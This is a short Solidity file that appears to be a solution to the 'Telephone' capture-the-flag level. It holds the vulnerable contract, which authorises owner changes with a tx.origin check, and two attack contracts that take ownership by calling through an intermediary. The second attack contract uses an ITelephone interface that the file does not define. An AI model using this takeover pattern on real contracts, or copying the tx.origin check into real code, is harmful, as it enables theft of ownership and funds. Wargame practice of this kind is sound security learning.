// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttack {
    function attack(address _telephone) public returns (bool) {
        (bool success,) = _telephone.call(abi.encodeWithSignature("changeOwner(address)",msg.sender));
    return success;

    }
}

//my solution
contract TelephoneAttack2{
    ITelephone public telephone;

    constructor (ITelephone _telephone){
        telephone = _telephone;
    }

    function attack() external {
            telephone.changeOwner(tx.origin);
    }
}
